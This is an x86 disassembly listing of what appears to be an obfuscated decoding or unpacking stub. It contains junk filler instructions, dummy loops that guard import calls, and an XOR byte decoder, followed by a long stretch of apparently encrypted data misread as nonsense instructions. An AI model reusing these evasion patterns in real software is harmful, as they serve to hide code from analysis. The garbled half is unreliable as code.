  41166c:	pop    esi
  41166d:	leave  
  41166e:	ret    0x18
  411671:	push   ebp
  411672:	mov    ebp,esp
  411674:	sub    esp,0x98
  41167a:	xor    ecx,eax
  41167c:	mov    ecx,DWORD PTR [ebp+0x8]
  41167f:	adc    DWORD PTR ds:0x42b004,0x2788
  411689:	mov    eax,0x8a8c
  41168e:	sub    DWORD PTR ds:0x42d01c,0x61b3
  411698:	xor    ax,WORD PTR [ecx+0x20]
  41169c:	mov    ecx,0x3b50
  4116a1:	xor    DWORD PTR ds:0x42c000,0x42b00c
  4116ab:	add    ax,cx
  4116ae:	movzx  ecx,BYTE PTR ds:0x42b010
  4116b5:	sub    DWORD PTR ds:0x42d008,ecx
  4116bb:	movzx  eax,ax
  4116be:	mov    DWORD PTR [ebp-0x14],eax
  4116c1:	mov    ecx,DWORD PTR ds:0x42b010
  4116c7:	add    DWORD PTR ds:0x42901c,ecx
  4116cd:	mov    BYTE PTR [ebp-0x1],0x79
  4116d1:	lea    eax,[ebp-0x1]
  4116d4:	mov    ecx,DWORD PTR ds:0x42b010
  4116da:	xor    ecx,DWORD PTR ds:0x42c000
  4116e0:	mov    DWORD PTR ds:0x42b010,ecx
  4116e6:	mov    DWORD PTR [ebp-0xc],eax
  4116e9:	and    DWORD PTR ds:0x429010,0x6b4e
  4116f3:	mov    al,BYTE PTR [ebp-0x1]
  4116f6:	sbb    DWORD PTR ds:0x42d000,edi
  4116fc:	mov    ecx,DWORD PTR [ebp-0xc]
  4116ff:	xor    al,0x73
  411701:	or     DWORD PTR ds:0x42a010,0x38
  41170b:	sub    al,0x9
  41170d:	adc    DWORD PTR ds:0x42c010,0x42a004
  411717:	mov    BYTE PTR [ecx],al
  411719:	mov    DWORD PTR ds:0x42c018,0x13
  411723:	cmp    DWORD PTR ds:0x42c018,0x0
  41172a:	je     0x4117ef
  411730:	cmp    DWORD PTR ds:0x42c018,0x22
  411737:	jne    0x411752
  41173d:	push   0x42e199
  411742:	push   0x42e23b
  411747:	push   0x544c
  41174c:	call   DWORD PTR ds:0x42ed83
  411752:	mov    eax,ds:0x42c018
  411757:	dec    eax
  411758:	mov    ds:0x42c018,eax
  41175d:	jmp    0x411723
  411762:	mov    DWORD PTR ds:0x42b004,0x11
  41176c:	cmp    DWORD PTR ds:0x42b004,0x0
  411773:	je     0x4117ef
  411779:	cmp    DWORD PTR ds:0x42b004,0x21
  411780:	jne    0x41178c
  411786:	call   DWORD PTR ds:0x42ed87
  41178c:	mov    ecx,DWORD PTR ds:0x42b004
  411792:	dec    ecx
  411793:	mov    DWORD PTR ds:0x42b004,ecx
  411799:	jmp    0x41176c
  41179e:	mov    DWORD PTR ds:0x42a004,0x1f
  4117a8:	cmp    DWORD PTR ds:0x42a004,0x0
  4117af:	je     0x4117ef
  4117b5:	cmp    DWORD PTR ds:0x42a004,0x28
  4117bc:	jne    0x4117d3
  4117c2:	push   DWORD PTR [ebp-0x14]
  4117c5:	push   0x42c008
  4117ca:	push   DWORD PTR [ebp-0x10]
  4117cd:	call   DWORD PTR ds:0x42ed8b
  4117d3:	mov    ecx,DWORD PTR ds:0x42a004
  4117d9:	dec    ecx
  4117da:	mov    DWORD PTR ds:0x42a004,ecx
  4117e0:	jmp    0x4117a8
  4117e5:	and    DWORD PTR ds:0x42c00c,0x3b9a
  4117ef:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  4117f6:	and    DWORD PTR ds:0x42a000,0x0
  411800:	jmp    0x411812
  411805:	mov    ecx,DWORD PTR ds:0x42a000
  41180b:	inc    ecx
  41180c:	mov    DWORD PTR ds:0x42a000,ecx
  411812:	cmp    DWORD PTR ds:0x42a000,0x18
  411819:	jae    0x41185e
  41181f:	cmp    DWORD PTR ds:0x42a000,0x9
  411826:	jne    0x41183f
  41182c:	push   0x42e199
  411831:	push   DWORD PTR [ebp-0x20]
  411834:	push   0x603c
  411839:	call   DWORD PTR ds:0x42ed8f
  41183f:	cmp    DWORD PTR ds:0x42a000,0x8
  411846:	jne    0x411859
  41184c:	mov    ecx,DWORD PTR ds:0x42a000
  411852:	inc    ecx
  411853:	mov    DWORD PTR ds:0x42a000,ecx
  411859:	jmp    0x411805
  41185e:	push   ebx
  41185f:	mov    ecx,DWORD PTR ds:0x42a000
  411865:	xor    DWORD PTR ds:0x42b004,ecx
  41186b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  411872:	xor    eax,eax
  411874:	xor    eax,DWORD PTR ds:0x429020
  41187a:	or     DWORD PTR ds:0x42c018,eax
  411880:	mov    ecx,DWORD PTR [ebp-0x18]
  411883:	adc    DWORD PTR ds:0x42d008,ecx
  411889:	push   esi
  41188a:	add    esi,DWORD PTR ds:0x42d000
  411890:	mov    eax,0x7510899
  411895:	add    DWORD PTR ds:0x42a01c,edi
  41189b:	xor    ecx,eax
  41189d:	mov    esi,0x3272e0
  4118a2:	mov    DWORD PTR ds:0x42b01c,0x49a5
  4118ac:	push   edi
  4118ad:	add    ecx,esi
  4118af:	jmp    0x4118c9
  4118b4:	mov    dl,BYTE PTR [ebp-0x1]
  4118b7:	mov    DWORD PTR ds:0x42d008,0x2685
  4118c1:	mov    BYTE PTR [ebp+ecx*1-0x98],dl
  4118c8:	inc    ecx
  4118c9:	cmp    ecx,0x40
  4118cc:	mov    DWORD PTR ds:0x429020,0x4a16
  4118d6:	jb     0x4118b4
  4118dc:	mov    DWORD PTR ds:0x42c008,0x3563
  4118e6:	mov    edx,DWORD PTR [ebp-0x18]
  4118e9:	add    DWORD PTR ds:0x42d014,0x7c84
  4118f3:	xor    edx,eax
  4118f5:	xor    DWORD PTR ds:0x42d00c,0x42d010
  4118ff:	add    edx,esi
  411901:	jmp    0x4119b0
  411906:	mov    DWORD PTR ds:0x42c014,0x1e
  411910:	cmp    DWORD PTR ds:0x42c014,0x0
  411917:	je     0x411953
  41191d:	cmp    DWORD PTR ds:0x42c014,0x21
  411924:	jne    0x411933
  41192a:	push   DWORD PTR [ebp-0x20]
  41192d:	call   DWORD PTR ds:0x42ed4f
  411933:	xor    edi,edi
  411935:	xor    edi,DWORD PTR ds:0x42c014
  41193b:	dec    edi
  41193c:	mov    DWORD PTR ds:0x42c014,edi
  411942:	jmp    0x411910
  411947:	mov    edi,DWORD PTR ds:0x42b008
  41194d:	sbb    DWORD PTR ds:0x42a004,edi
  411953:	mov    edi,DWORD PTR [ebp+0x8]
  411956:	sbb    DWORD PTR ds:0x42901c,0x7b78
  411960:	mov    ecx,0x8a8c
  411965:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41196a:	or     DWORD PTR ds:0x429020,0x232e
  411974:	mov    edi,0x3b50
  411979:	add    DWORD PTR ds:0x42c010,0x42b010
  411983:	add    cx,di
  411986:	movzx  ecx,cx
  411989:	mov    DWORD PTR [ebp-0xc],ecx
  41198c:	mov    ecx,DWORD PTR [ebp+0x8]
  41198f:	sub    DWORD PTR ds:0x42c000,0x42c00c
  411999:	movzx  ecx,WORD PTR [ecx+edx*4]
  41199d:	xor    ecx,0x8a8c
  4119a3:	add    ecx,edi
  4119a5:	mov    edi,DWORD PTR [ebp-0xc]
  4119a8:	mov    BYTE PTR [ebp+edi*1-0x98],cl
  4119af:	inc    edx
  4119b0:	not    ecx
  4119b2:	mov    ecx,DWORD PTR [ebp-0x14]
  4119b5:	mov    DWORD PTR ds:0x42d008,0x3da8
  4119bf:	cmp    edx,ecx
  4119c1:	mov    DWORD PTR ds:0x42b00c,0x9ea
  4119cb:	jne    0x411906
  4119d1:	mov    ecx,DWORD PTR [ebp-0x18]
  4119d4:	mov    edx,DWORD PTR [ebp+0x10]
  4119d7:	xor    ecx,eax
  4119d9:	add    ecx,esi
  4119db:	mov    DWORD PTR [edx],ecx
  4119dd:	sbb    ecx,DWORD PTR ds:0x42b01c
  4119e3:	mov    ecx,DWORD PTR [ebp-0x18]
  4119e6:	xor    ecx,eax
  4119e8:	add    ecx,esi
  4119ea:	and    DWORD PTR ds:0x429014,0x0
  4119f4:	xor    edi,edi
  4119f6:	xor    edi,DWORD PTR ds:0x429014
  4119fc:	inc    edi
  4119fd:	mov    DWORD PTR ds:0x429014,edi
  411a03:	cmp    DWORD PTR ds:0x429014,0x1b
  411a0a:	jne    0x411a22
  411a10:	push   0x42e0a2
  411a15:	push   0x0
  411a17:	push   0x1
  411a19:	push   DWORD PTR [ebp-0x10]
  411a1c:	call   DWORD PTR ds:0x42ed53
  411a22:	cmp    DWORD PTR ds:0x429014,0x18
  411a29:	jb     0x4119f4
  411a2f:	sub    edi,DWORD PTR ds:0x429024
  411a35:	mov    DWORD PTR [ebp-0xc],ecx
  411a38:	adc    DWORD PTR ds:0x429000,0x3601
  411a42:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  411a49:	mov    DWORD PTR [ebp-0x10],0xf89c85a9
  411a50:	sbb    ecx,ecx
  411a52:	mov    DWORD PTR [ebp-0x14],0xf89c95b9
  411a59:	add    ecx,ecx
  411a5b:	mov    ecx,DWORD PTR [ebp-0x10]
  411a5e:	and    DWORD PTR ds:0x42a018,0x0
  411a68:	mov    edi,DWORD PTR ds:0x42a018
  411a6e:	inc    edi
  411a6f:	mov    DWORD PTR ds:0x42a018,edi
  411a75:	cmp    DWORD PTR ds:0x42a018,0xa
  411a7c:	jne    0x411a8d
  411a82:	push   0x42e205
  411a87:	call   DWORD PTR ds:0x42ed57
  411a8d:	cmp    DWORD PTR ds:0x42a018,0x9
  411a94:	jne    0x411aa9
  411a9a:	xor    edi,edi
  411a9c:	or     edi,DWORD PTR ds:0x42a018
  411aa2:	inc    edi
  411aa3:	mov    DWORD PTR ds:0x42a018,edi
  411aa9:	cmp    DWORD PTR ds:0x42a018,0x17
  411ab0:	jb     0x411a68
  411ab6:	mov    edi,DWORD PTR ds:0x42d014
  411abc:	sbb    DWORD PTR ds:0x42c018,edi
  411ac2:	mov    DWORD PTR [ebp+0x8],ecx
  411ac5:	or     ecx,0x1035
  411acb:	mov    ecx,DWORD PTR [ebp+0x8]
  411ace:	xor    ecx,eax
  411ad0:	inc    edi
  411ad1:	add    ecx,esi
  411ad3:	mov    DWORD PTR ds:0x42900c,edx
  411ad9:	mov    ecx,0x242ebed
  411ade:	mov    edi,0xf641bea
  411ae3:	je     0x41f655
  411ae9:	mov    edx,DWORD PTR [ebp+0x8]
  411aec:	mov    ebx,DWORD PTR [ebp-0x8]
  411aef:	xor    edx,eax
  411af1:	jmp    0x413e7a
  411af6:	aas    
  411af7:	xor    esp,DWORD PTR [ecx]
  411af9:	es cmc 
  411afb:	hlt    
  411afc:	and    edi,DWORD PTR [ebx]
  411afe:	sbb    al,0xe
  411b00:	icebp  
  411b01:	in     eax,0x57
  411b03:	mov    ch,0xe6
  411b05:	ja     0x411b20
  411b07:	scas   al,BYTE PTR es:[edi]
  411b08:	jp     0x411b84
  411b0a:	push   es
  411b0b:	pop    edi
  411b0c:	jp     0x411b88
  411b0e:	adc    DWORD PTR [ebx+ecx*4-0x65],edi
  411b12:	push   es
  411b13:	mov    cl,bl
  411b15:	ret    0x98b1
  411b18:	ss adc cl,al
  411b1b:	es adc al,0xeb
  411b1e:	push   ds
  411b1f:	sbb    al,0xa6
  411b21:	xlat   BYTE PTR ds:[ebx]
  411b22:	inc    ebx
  411b23:	fnsave [ecx]
  411b25:	loope  0x411b85
  411b27:	test   BYTE PTR [ecx-0x76],dh
  411b2a:	adc    dh,cl
  411b2c:	mov    al,ds:0x4427a5d
  411b31:	mov    ch,0x92
  411b33:	aaa    
  411b34:	mov    ebp,0xa2ce6ca9
  411b39:	xlat   BYTE PTR ds:[ebx]
  411b3a:	(bad)  
  411b3b:	jecxz  0x411b02
  411b3d:	cs or  al,0x5f
  411b40:	enter  0x92d1,0xb6
  411b44:	repnz or esp,DWORD PTR [ebx+0x633d9545]
  411b4b:	fcmovnbe st,st(5)
  411b4d:	imul   edi,DWORD PTR [esi-0x52],0xe9695754
  411b54:	rcr    DWORD PTR [eax],0x14
  411b57:	mov    dl,BYTE PTR [edi+esi*4-0x265aac04]
  411b5e:	call   0x98a02245
  411b63:	xlat   BYTE PTR ds:[ebx]
  411b64:	ins    DWORD PTR es:[edi],dx
  411b65:	icebp  
  411b66:	sbb    BYTE PTR [esi+0x608bc0ca],dl
  411b6c:	cwde   
  411b6d:	mov    ebp,0x4e87c430
  411b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b73:	test   al,0x7e
  411b75:	xchg   edx,eax
  411b76:	adc    bl,BYTE PTR [edi+0x74ceece4]
  411b7c:	xchg   ebx,eax
  411b7d:	adc    ch,ah
  411b7f:	mov    ch,0x18
  411b81:	rcr    BYTE PTR [ecx+0x3cee89cf],0x9a
  411b88:	mov    edi,ebx
  411b8a:	push   ss
  411b8b:	xor    DWORD PTR [edx],0xffffff84
  411b8e:	pop    eax
  411b8f:	loopne 0x411ba4
  411b91:	call   0x1826:0x4a43b573
  411b98:	sbb    ch,al
  411b9a:	stos   DWORD PTR es:[edi],eax
  411b9b:	push   edi
  411b9c:	push   edi
  411b9d:	pop    es
  411b9e:	stos   DWORD PTR es:[edi],eax
  411b9f:	sub    eax,0x8eaf31a5
  411ba4:	add    WORD PTR [esi],dx
  411ba7:	dec    esi
  411ba8:	add    dh,ch
  411baa:	les    eax,FWORD PTR [eax-0x3539e4e5]
  411bb0:	jp     0x411c21
  411bb2:	xor    ebp,esp
  411bb4:	inc    esp
  411bb5:	stos   DWORD PTR es:[edi],eax
  411bb6:	push   esi
  411bb7:	pop    ebx
  411bb8:	mov    ebx,0xe8edbc72
  411bbd:	cmp    edx,DWORD PTR [edx+0x76861aa5]
  411bc3:	xchg   ebp,eax
  411bc4:	push   esp
  411bc5:	jp     0x411b4e
  411bc7:	push   ebx
  411bc8:	mov    al,ds:0x5d866c9e
  411bcd:	(bad)  
  411bce:	hlt    
  411bcf:	mov    al,ds:0x1b81e6c
  411bd4:	cmp    eax,0xaa330a4e
  411bd9:	xor    eax,0x970d1e12
  411bde:	sar    DWORD PTR [ecx],cl
  411be0:	addr16 dec edx
  411be2:	ds sahf 
  411be4:	idiv   DWORD PTR [esi+0x4f09c18]
  411bea:	or     al,0x6d
  411bec:	pmulhuw mm1,QWORD PTR [edi+ebx*1]
  411bf0:	aaa    
  411bf1:	sahf   
  411bf2:	mov    al,ds:0x4d0dcd12
  411bf7:	call   0xd220:0x51b8ee53
  411bfe:	stos   BYTE PTR es:[edi],al
  411bff:	lods   eax,DWORD PTR ds:[esi]
  411c00:	inc    ecx
  411c01:	repz xchg ebp,eax
  411c03:	lahf   
  411c04:	jmp    0x200c:0x538230a2
  411c0b:	cmp    al,0x5
  411c0d:	enter  0x9703,0xce
  411c11:	or     eax,0x423932de
  411c16:	fdiv   QWORD PTR [ebx+0x5d]
  411c19:	pushf  
  411c1a:	adc    DWORD PTR [ecx+0x67961e74],ebx
  411c20:	sub    al,0xe1
  411c22:	ss xor ecx,ebp
  411c25:	mov    al,0x7c
  411c27:	mov    ds:0x4d6fde8d,eax
  411c2c:	aaa    
  411c2d:	je     0x411be3
  411c2f:	mov    ecx,DWORD PTR [ecx-0x5a]
  411c32:	lahf   
  411c33:	imul   ebx,ebx,0xd25618a8
  411c39:	mov    edx,0x945bfc60
  411c3e:	cmp    esi,DWORD PTR ds:0xa66f330e
  411c44:	xchg   edx,eax
  411c45:	add    eax,edx
  411c47:	cmp    eax,0xf4738265
  411c4c:	add    eax,0x5f54e317
  411c51:	and    al,0xdc
  411c53:	add    BYTE PTR [eax+edi*8+0x79],al
  411c57:	aad    0x9a
  411c59:	into   
  411c5a:	stos   DWORD PTR es:[edi],eax
  411c5b:	(bad)  
  411c5d:	sub    dh,BYTE PTR [edx+0x71]
  411c60:	push   ds
  411c61:	sub    ebx,ebp
  411c63:	push   ss
  411c64:	stos   DWORD PTR es:[edi],eax
  411c65:	js     0x411c03
  411c67:	xchg   BYTE PTR [edi-0x72],bh
  411c6a:	cmp    BYTE PTR [edx+0x2b],bl
  411c6d:	jo     0x411ceb
  411c6f:	mov    ebx,0x1bd80e94
  411c74:	ret    0xeaf7
  411c77:	dec    edi
  411c78:	arpl   WORD PTR [ebx+0x7f],bx
  411c7b:	int3   
  411c7c:	xchg   ebx,eax
  411c7d:	pusha  
  411c7e:	xor    BYTE PTR [ebx],ah
  411c80:	sbb    DWORD PTR [edx+ebp*2-0x2f85203d],eax
  411c87:	sbb    bh,BYTE PTR [eax+0x6b]
  411c8a:	bound  esi,QWORD PTR [edi-0x63cf2d65]
  411c90:	push   0x48
  411c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c93:	les    ebx,FWORD PTR [edx]
  411c95:	push   ss
  411c96:	cmp    al,0x83
  411c98:	stos   DWORD PTR es:[edi],eax
  411c99:	push   cs
  411c9a:	cdq    
  411c9b:	add    eax,0xcafa20c2
  411ca0:	rol    DWORD PTR [ebx+ebp*4-0x7927270],0x4c
  411ca8:	mov    edi,0x3351c3e0
  411cad:	repnz mov ecx,0xf4f8a27b
  411cb3:	int3   
  411cb4:	sti    
  411cb5:	je     0x411c7f
  411cb7:	lds    edi,FWORD PTR [ebx+esi*8]
  411cba:	jae    0x411d04
  411cbc:	fwait
  411cbd:	pop    ds
  411cbe:	xchg   ebp,eax
  411cbf:	and    al,0x72
  411cc1:	icebp  
  411cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cc3:	mov    BYTE PTR [edi-0x5f],bl
  411cc6:	adc    al,0xee
  411cc8:	pushf  
  411cc9:	out    0x55,al
  411ccb:	pushf  
  411ccc:	jns    0x411d05
  411cce:	xor    esp,ebp
  411cd0:	lods   al,BYTE PTR ds:[esi]
  411cd1:	fisubr WORD PTR [ebx+0x20]
  411cd4:	mov    eax,ds:0x23645f5c
  411cd9:	es jge 0x411d12
  411cdc:	repz pop es
  411cde:	dec    eax
  411cdf:	mov    dl,0x17
  411ce1:	push   0x66e5da07
  411ce6:	inc    ebx
  411ce7:	and    dh,0x51
  411cea:	cli    
  411ceb:	jp     0x411d1d
  411ced:	neg    BYTE PTR [ebx-0xe]
  411cf0:	or     DWORD PTR [edi],ecx
  411cf2:	sti    
  411cf3:	mov    WORD PTR ds:0x74e645d7,cs
  411cf9:	int3   
  411cfa:	push   esp
  411cfb:	sub    al,0x31
  411cfd:	adc    edx,DWORD PTR [ebx+0x35]
  411d00:	sub    esp,0xffffff93
  411d03:	leave  
  411d04:	pop    ebp
  411d05:	mov    bh,0x56
  411d07:	mov    eax,0x2a00b1f3
  411d0c:	ficomp DWORD PTR [esi-0x75]
  411d0f:	pop    ds
  411d10:	xchg   edi,eax
  411d11:	or     eax,0x2bb7a82a
  411d16:	cmp    eax,0x7a52ea28
  411d1b:	xchg   esp,eax
  411d1c:	imul   ecx,ecx,0x5cc31b5a
  411d22:	fwait
  411d23:	xlat   BYTE PTR ds:[ebx]
  411d24:	fucomp st(5)
  411d26:	mov    al,ds:0x2f246bcc
  411d2b:	fild   QWORD PTR [ebp-0x507a4d9b]
  411d31:	popa   
  411d32:	stc    
  411d33:	fs rcr ebx,cl
  411d36:	dec    edi
  411d37:	push   ss
  411d38:	or     al,0x5
  411d3a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411d3c:	es mov dh,0x41
  411d3f:	fstp   TBYTE PTR [ebx-0x5b5501c7]
  411d45:	jns    0x411d9d
  411d47:	stos   BYTE PTR es:[edi],al
  411d48:	cmp    esp,edi
  411d4a:	jp     0x411d7f
  411d4c:	jnp    0x411dc3
  411d4e:	xchg   ebx,eax
  411d4f:	sub    DWORD PTR [eax+0x7d],ecx
  411d52:	sub    dh,dl
  411d54:	aad    0x2b
  411d56:	jl     0x411d93
  411d58:	std    
  411d59:	sub    al,0x19
  411d5b:	add    ch,BYTE PTR [ecx+0x33]
  411d5e:	les    esp,FWORD PTR [ebx+esi*2-0x14]
  411d62:	pop    edi
  411d63:	rcr    BYTE PTR [ebp-0x1b787484],0x88
  411d6a:	(bad)  
  411d6b:	outs   dx,BYTE PTR ds:[esi]
  411d6c:	add    eax,0xd64df4ca
  411d71:	(bad)  
  411d72:	bswap  ebx
  411d74:	add    DWORD PTR [edi-0x30],esp
  411d77:	fimul  DWORD PTR [ecx-0x3603e84a]
  411d7d:	jmp    0xff7c:0x9ec6fb
  411d84:	rcl    BYTE PTR [edx+esi*4],1
  411d87:	jmp    0xf41d2bbe
  411d8c:	lods   eax,DWORD PTR ds:[esi]
  411d8d:	add    edx,DWORD PTR [eax-0x4a5c79ef]
  411d93:	fmul   DWORD PTR [edi]
  411d95:	dec    edx
  411d96:	and    dl,0xd0
  411d99:	jbe    0x411dae
  411d9b:	adc    DWORD PTR [ebp-0x1f],ebp
  411d9e:	mov    edx,esp
  411da0:	clc    
  411da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411da2:	add    cl,BYTE PTR [esi-0x33]
  411da5:	push   edi
  411da6:	add    eax,edx
  411da8:	dec    eax
  411da9:	inc    eax
  411daa:	jmp    0x9bb8:0x93b24cf7
  411db1:	adc    al,0x2c
  411db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411db4:	mov    ch,0xdf
  411db6:	and    DWORD PTR [esi-0x172e95e3],esi
  411dbc:	mov    eax,ds:0x24a30e31
  411dc1:	pop    ebx
  411dc2:	mov    al,0x22
  411dc4:	push   cs
  411dc5:	dec    esi
  411dc6:	push   ebx
  411dc7:	xlat   BYTE PTR ds:[ebx]
  411dc8:	mov    ebp,0x6ad6fe0f
  411dcd:	in     al,dx
  411dce:	and    BYTE PTR [ecx+0x64],ch
  411dd1:	arpl   WORD PTR [edi-0x33],dx
  411dd4:	mov    eax,0xb3d86b24
  411dd9:	sub    dh,BYTE PTR [edx-0x1914014c]
  411ddf:	pop    ebp
  411de0:	dec    ecx
  411de1:	test   al,0x8e
  411de3:	mov    esp,0xb7a66093
  411de8:	ret    
  411de9:	sbb    DWORD PTR [esp+esi*2],ebx
  411dec:	ror    BYTE PTR [esi+0x24],0xbf
  411df0:	arpl   WORD PTR [edi],dx
  411df2:	adc    ecx,DWORD PTR [esi+ebx*2]
  411df5:	sub    DWORD PTR [edx],edi
  411df7:	inc    edi
  411df8:	push   ds
  411df9:	cmp    ebx,DWORD PTR [edi+ecx*2]
  411dfc:	enter  0x6656,0xd
  411e00:	(bad)  
  411e01:	xor    DWORD PTR [ebx+0x8],esp
  411e04:	(bad)  [esi+0x33344f73]
  411e0a:	jmp    0x411e51
  411e0c:	enter  0xd2e5,0x53
  411e10:	cdq    
  411e11:	(bad)  
  411e12:	pop    edx
  411e13:	push   edx
  411e14:	adc    BYTE PTR [edx-0x4e],bh
  411e17:	dec    ebx
  411e18:	ror    BYTE PTR [edi-0x457cc4b7],0xa
  411e1f:	(bad)  
  411e21:	daa    
  411e22:	ins    BYTE PTR es:[edi],dx
  411e23:	cwde   
  411e24:	cdq    
  411e25:	dec    ebp
  411e26:	je     0x411e0f
  411e28:	ror    BYTE PTR [ebp+0x40],1
  411e2b:	mov    BYTE PTR [ecx],bl
  411e2d:	xchg   ebx,eax
  411e2e:	push   0x50abeebc
  411e33:	xchg   esi,eax
  411e34:	push   esp
  411e35:	jb     0x411ea8
  411e37:	or     DWORD PTR [edx],edi
  411e39:	add    DWORD PTR ds:0xa7c87e3e,ebp
  411e3f:	dec    ecx
  411e40:	adc    BYTE PTR [esi-0x6181bc4f],al
  411e46:	pusha  
  411e47:	je     0x411e68
  411e49:	mov    edi,0x79082f4e
  411e4e:	cdq    
  411e4f:	leave  
  411e50:	dec    edi
  411e51:	aas    
  411e52:	adc    edi,DWORD PTR [ebp-0x4d02e467]
  411e58:	in     al,dx
  411e59:	into   
  411e5a:	pop    eax
  411e5b:	in     al,0x11
  411e5d:	jns    0x411ec6
  411e5f:	aad    0xa5
  411e61:	sbb    al,BYTE PTR [ebx-0x3ee549d7]
  411e67:	int3   
  411e68:	fild   WORD PTR [ebx]
  411e6a:	and    BYTE PTR [esi+edi*8-0x43f2c5a5],ch
  411e71:	or     ebp,ecx
  411e73:	push   edx
  411e74:	icebp  
  411e75:	cmp    ah,ch
  411e77:	push   esi
  411e78:	xlat   BYTE PTR ds:[ebx]
  411e79:	inc    esi
  411e7a:	mov    esp,0x46124a2b
  411e7f:	push   esp
  411e80:	push   es
  411e81:	sbb    al,0xe8
  411e83:	rcr    DWORD PTR [eax+0x58],cl
  411e86:	(bad)  
  411e87:	cmp    edi,DWORD PTR [ebp+0x23]
  411e8a:	dec    edi
  411e8b:	pop    eax
  411e8c:	mov    esi,0xcb1522e1
  411e91:	fisttp QWORD PTR [edi-0x25]
  411e94:	add    dh,BYTE PTR ds:0xbbb74c0c
  411e9a:	cmc    
  411e9b:	xor    dh,ah
  411e9d:	das    
  411e9e:	mov    edx,0xf6f51a1e
  411ea3:	inc    ecx
  411ea4:	jmp    0x33fae6ab
  411ea9:	repnz std 
  411eab:	daa    
  411eac:	out    dx,eax
  411ead:	mov    ecx,0xdd93b368
  411eb2:	lds    eax,FWORD PTR [edi-0x3e7bf08c]
  411eb8:	xchg   edx,eax
  411eb9:	push   edi
  411eba:	fld    QWORD PTR [edi-0x32b61724]
  411ec0:	pop    edi
  411ec1:	jns    0x411f3d
  411ec3:	in     al,0xcb
  411ec5:	pop    ebp
  411ec6:	adc    ah,bh
  411ec8:	adc    al,0xe1
  411eca:	div    DWORD PTR [edx]
  411ecc:	adc    DWORD PTR [eax+0x3478a91b],ebp
  411ed2:	inc    ecx
  411ed3:	ret    0xecad
  411ed6:	xchg   edi,eax
  411ed7:	adc    al,0x39
  411ed9:	dec    ebp
  411eda:	inc    ebp
  411edb:	push   ebp
  411edc:	call   0xcf73:0x164b7054
  411ee3:	sbb    dh,BYTE PTR [ebx]
  411ee5:	je     0x411ef9
  411ee7:	outs   dx,DWORD PTR ds:[esi]
  411ee8:	sub    DWORD PTR [ecx-0x65],ecx
  411eeb:	in     al,0x3a
  411eed:	mov    al,0xcf
  411eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef0:	add    ah,BYTE PTR [edx-0x59]
  411ef3:	jle    0x411e8d
  411ef5:	xchg   DWORD PTR [ecx+0x69],eax
  411ef8:	hlt    
  411ef9:	pop    ecx
  411efa:	addr16 (bad) 
  411efc:	push   edi
  411efd:	fnstsw WORD PTR [ecx-0x4f3659c3]
  411f03:	sub    bh,BYTE PTR [eax+0xa]
  411f06:	push   esp
  411f07:	cs push 0x28885de0
  411f0d:	push   edi
  411f0e:	rol    DWORD PTR [eax],1
  411f10:	mov    eax,0x2e135b96
  411f15:	push   ecx
  411f16:	pop    ebp
  411f17:	inc    ebx
  411f18:	jne    0x411f39
  411f1a:	pop    esp
  411f1b:	into   
  411f1c:	in     eax,0x36
  411f1e:	loope  0x411ee9
  411f20:	sub    edi,DWORD PTR [edx-0x12]
  411f23:	ret    
  411f24:	mov    ebx,0xcfe0deca
  411f29:	sbb    al,0x28
  411f2b:	sbb    al,0x4b
  411f2d:	inc    esp
  411f2e:	das    
  411f2f:	or     al,0xa
  411f31:	push   ebp
  411f32:	pop    edi
  411f33:	and    eax,0x922952bb
  411f38:	lock out dx,al
  411f3a:	or     dl,bl
  411f3c:	(bad)  
  411f3d:	je     0x411fa3
  411f3f:	imul   edi,DWORD PTR [edi+0x24],0xffffff9b
  411f43:	mov    bh,0xf4
  411f45:	ret    0xf4b7
  411f48:	xor    BYTE PTR ds:0x4952fc06,bh
  411f4e:	adc    BYTE PTR [edx],bl
  411f50:	mov    al,0xf0
  411f52:	push   ds
  411f53:	fstp   TBYTE PTR [ebp-0x6ef0e865]
  411f59:	cmp    BYTE PTR [eax+edx*2],bh
  411f5c:	call   FWORD PTR [ebx-0x70296e00]
  411f62:	ds pop edi
  411f64:	inc    esp
  411f65:	lock mov ecx,0xffd20aec
  411f6b:	and    al,0x26
  411f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f6e:	psraw  mm6,mm1
  411f71:	retf   0xa29d
  411f74:	cmp    DWORD PTR [eax-0x289c5372],esi
  411f7a:	loope  0x411f0b
  411f7c:	test   esp,ecx
  411f7e:	mov    cl,BYTE PTR [esi-0xe321b1f]
  411f84:	retf   
  411f85:	mov    ecx,0x6d692001
  411f8a:	stos   DWORD PTR es:[edi],eax
  411f8b:	or     esp,DWORD PTR [ecx+0x6f]
  411f8e:	repz jge 0x411f14
  411f91:	lock pop edi
  411f93:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  411f95:	sub    BYTE PTR [eax+ebp*4+0x28],dl
  411f99:	xchg   esi,eax
  411f9a:	xor    al,0x6a
  411f9c:	sbb    al,0x15
  411f9e:	shl    DWORD PTR [edi+0x14],0x76
  411fa2:	jae    0x411f2d
  411fa4:	xchg   edx,eax
  411fa5:	in     eax,dx
  411fa6:	icebp  
  411fa7:	jne    0x411f33
  411fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411faa:	stc    
  411fab:	sbb    eax,DWORD PTR [esi]
  411fad:	(bad)  
  411fae:	je     0x411fde
  411fb0:	pop    edx
  411fb1:	xor    BYTE PTR [ecx+0x60],al
  411fb4:	das    
  411fb5:	xchg   ecx,eax
  411fb6:	add    esp,esp
  411fb8:	lock out dx,eax
  411fba:	cmp    DWORD PTR fs:[edi-0x6a],edx
  411fbe:	xchg   ebx,eax
  411fbf:	xchg   BYTE PTR [esi-0x68646500],dl
  411fc5:	inc    esi
  411fc6:	(bad)  
  411fc7:	stos   DWORD PTR es:[edi],eax
  411fc8:	pop    es
  411fc9:	lods   al,BYTE PTR ds:[esi]
  411fca:	push   ebp
  411fcb:	mov    ebp,0x1f08fd7b
  411fd0:	push   edi
